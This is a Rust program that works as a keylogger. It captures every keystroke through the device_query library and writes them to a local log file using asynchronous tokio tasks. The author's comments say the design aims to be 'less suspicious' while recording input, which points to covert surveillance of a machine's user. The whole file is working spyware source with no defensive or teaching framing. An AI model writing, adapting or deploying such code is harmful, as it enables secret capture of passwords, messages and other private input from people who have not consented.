use device_query::{DeviceEvents, DeviceState}; // Device library to grab keyboard inputs
use tokio::sync::mpsc; // To create sender receiver
use tokio::{fs::File, io::AsyncWriteExt}; // To createa async write to file

/// Reason for the asynchronisity
/// Use two tasks, one to handle IO with files and the second to capture keyboard inputs
/// Reason I opted for this is to compensate for the fact that writing to a file is a much more expensive task than capturing keyboard inouts
/// Ideally we want to caputre inputs whilst we save to the file, one to reduce memory and to be less suspicious
/// The second to not halt the program and skipout on input. Mpsc works greatly for such scenario whilst not being as suspicious
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = DeviceState::new(); // Create device state handler
    let file = File::create("./log.txt").await?; // create patth
    let (tx, mut rx) = mpsc::unbounded_channel::<String>(); // create bounded channel
    tokio::spawn(async move {
        // Create task to write to file
        let mut file = file;
        while let Some(key) = rx.recv().await {
            // While the channel hasn't closed and still receiving messages from the transmitter
            file.write(key.as_bytes()).await.unwrap(); // White byte strings to file
        }
    });
    let tx1 = tx.clone();
    let _guard = listener.on_key_down(move |k| {
        // Create task to listen to keyboard inputs and send them to the file
        tx1.send(k.to_string()).unwrap();
    });

    loop {}
}
